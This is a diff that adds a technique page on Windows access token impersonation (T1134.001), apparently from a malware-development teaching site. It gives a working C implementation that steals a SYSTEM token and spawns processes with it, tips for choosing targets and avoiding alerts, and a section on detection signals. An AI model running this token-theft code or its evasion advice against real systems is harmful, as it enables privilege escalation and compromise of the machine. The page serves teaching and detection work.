@@ -1,0 +1,190 @@
+---
+title: Access Token Impersonation
+mitre: T1134.001
+category: credential-access
+group: Token Manipulation
+summary: Steal and impersonate a privileged token from a running process to assume its identity.
+platform: [Windows]
+tags: ['C / C++', 'WinAPI', 'Tokens']
+updated: '2026-08-04'
+author: thehackersbrain
+readingTime: 7 min read
+callChain:
+  - call: OpenProcess(PROCESS_QUERY_INFORMATION)
+    desc: Open a handle to a target process running as the desired user (SYSTEM, domain admin, etc.).
+    dll: kernel32
+  - call: OpenProcessToken(TOKEN_DUPLICATE)
+    desc: Get the primary token of that process.
+    dll: advapi32
+  - call: DuplicateTokenEx(SecurityImpersonation)
+    desc: Create an impersonation token from the primary token.
+    dll: advapi32
+  - call: ImpersonateLoggedOnUser / SetThreadToken
+    desc: Apply the impersonation token to the current thread.
+    dll: advapi32
+  - call: (optional) CreateProcessWithTokenW
+    desc: Spawn a new process running under the stolen token — a full primary token, not just impersonation.
+    dll: advapi32
+detections:
+  - src: SYSMON EID 10
+    text: Cross-process handle opens with PROCESS_QUERY_INFORMATION from an unexpected parent.
+  - src: ETW-TI
+    text: DuplicateToken / ImpersonateLoggedOnUser on a token belonging to a higher-privileged user.
+  - src: BEHAVIOURAL
+    text: A process whose effective token user differs from the user that spawned it — token was swapped after creation.
+  - src: SYSMON EID 1
+    text: CreateProcessWithTokenW from a non-system parent spawning a child with a SYSTEM or high-integrity token.
+related:
+  - mitre: T1003.001
+    title: LSASS Memory Dump
+    desc: Common upstream step — dump LSASS, extract tokens or hashes, then impersonate.
+    href: /techniques/credential-access/lsass-memory-dump
+  - mitre: T1548.002
+    title: UAC Bypass
+    desc: Elevate from medium to high integrity before token theft requires a privileged source.
+  - mitre: T1550.003
+    title: Pass-the-Ticket
+    desc: Kerberos ticket injection is the domain-aware alternative to NTLM token abuse.
+labKit:
+  - label: token_steal.c + Makefile
+    href: 'https://github.com/thehackersbrain/maldev-lab-kit'
+  - label: Sigma rule pack
+    href: /detections
+---
+
+import Callout from '../../../components/Callout.astro';
+import CallChain from '../../../components/CallChain.astro';
+import CodeBlock from '../../../components/CodeBlock.astro';
+import DetectionGrid from '../../../components/DetectionGrid.astro';
+import RelatedList from '../../../components/RelatedList.astro';
+
+## Overview
+
+Every process on Windows runs under an access token that encodes identity, integrity level, and
+privileges. Token impersonation lets a lower-privileged process clone a higher-privileged token
+and act as that identity for the duration of the impersonation — without knowing the account's
+password, and without generating a network logon event.
+
+The canonical target is a SYSTEM-level process (`winlogon.exe`, `services.exe`, a Windows
+service). Cloning its token and spawning a shell with `CreateProcessWithTokenW` yields a SYSTEM
+shell in a single, all-local operation.
+
+<Callout type="note">
+  `SeDebugPrivilege` is required to open handles to processes running under a different user.
+  An administrator has this privilege by default but must enable it first —
+  `AdjustTokenPrivileges` is the API; Mimikatz calls `privilege::debug` to do the same.
+</Callout>
+
+## The call chain
+
+<CallChain steps={frontmatter.callChain} />
+
+## Reference implementation
+
+<CodeBlock
+  file="token_steal.c"
+  label="C"
+  lang="c"
+  class="mb-7.5"
+  code={`#include \u003cwindows.h\u003e
+
+static BOOL enable_debug_priv(void) {
+    HANDLE tok;
+    OpenProcessToken(GetCurrentProcess(),
+                     TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tok);
+    LUID luid;
+    LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &luid);
+    TOKEN_PRIVILEGES tp = {
+        .PrivilegeCount = 1,
+        .Privileges[0]  = { .Luid = luid,
+                             .Attributes = SE_PRIVILEGE_ENABLED }
+    };
+    BOOL ok = AdjustTokenPrivileges(tok, FALSE, &tp, sizeof tp, NULL, NULL);
+    CloseHandle(tok);
+    return ok && GetLastError() != ERROR_NOT_ALL_ASSIGNED;
+}
+
+// steal the token from any process we can open
+HANDLE steal_token(DWORD target_pid) {
+    HANDLE proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, target_pid);
+    if (!proc) return NULL;
+
+    HANDLE primary_tok = NULL;
+    OpenProcessToken(proc, TOKEN_DUPLICATE, &primary_tok);
+    CloseHandle(proc);
+
+    HANDLE imp_tok = NULL;
+    DuplicateTokenEx(primary_tok,
+                     TOKEN_ALL_ACCESS, NULL,
+                     SecurityImpersonation,
+                     TokenImpersonation,
+                     &imp_tok);
+    CloseHandle(primary_tok);
+    return imp_tok;
+}
+
+// impersonate in-thread (affects all subsequent access checks on this thread)
+void impersonate(DWORD target_pid) {
+    enable_debug_priv();
+    HANDLE tok = steal_token(target_pid);
+    ImpersonateLoggedOnUser(tok);  // thread now runs as target_pid's user
+    // ... do privileged work ...
+    RevertToSelf();
+    CloseHandle(tok);
+}
+
+// or: spawn a new process under the stolen identity
+void spawn_as(DWORD target_pid, const wchar_t *cmd) {
+    enable_debug_priv();
+    HANDLE ptok = NULL;
+    HANDLE proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, target_pid);
+    OpenProcessToken(proc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &ptok);
+    CloseHandle(proc);
+
+    HANDLE new_tok = NULL;
+    DuplicateTokenEx(ptok, TOKEN_ALL_ACCESS, NULL,
+                     SecurityImpersonation, TokenPrimary, &new_tok);
+    CloseHandle(ptok);
+
+    STARTUPINFOW si = { .cb = sizeof si };
+    PROCESS_INFORMATION pi = {0};
+    CreateProcessWithTokenW(new_tok, 0, NULL, (LPWSTR)cmd,
+                            CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
+    CloseHandle(new_tok);
+}`}
+/>
+
+## Token types
+
+| Type | Scope | Obtained via |
+|---|---|---|
+| Primary | Entire process identity | `CreateProcessWithTokenW` |
+| Impersonation | Thread-level, reverts on `RevertToSelf` | `ImpersonateLoggedOnUser` / `SetThreadToken` |
+| Restricted | Subset of privileges (sandboxing) | `CreateRestrictedToken` |
+
+For persistence, spawn a new primary-token process. For privilege escalation within the current
+session, thread impersonation is lower footprint — no new process to detect.
+
+## Choosing a target process
+
+| Target | Requires | Gives |
+|---|---|---|
+| `winlogon.exe` | SeDebugPrivilege | SYSTEM |
+| `services.exe` | SeDebugPrivilege | SYSTEM |
+| Any service account process | SeDebugPrivilege | That service account |
+| Logged-in user's process | Same integrity or SeDebugPrivilege | Domain user token |
+
+`winlogon.exe` is reliable; there is always exactly one, it is always SYSTEM, and it does not
+exit unexpectedly. `lsass.exe` is also SYSTEM but touching it generates high-fidelity alerts.
+
+## Detection
+
+<DetectionGrid items={frontmatter.detections} />
+
+The most reliable ongoing signal is checking whether a process's effective user (from the
+current thread token) matches the user recorded in its process creation event. A mismatch is
+structurally anomalous and has almost no legitimate explanation on a managed endpoint.
+
+## Variants & related
+
+<RelatedList items={frontmatter.related} />
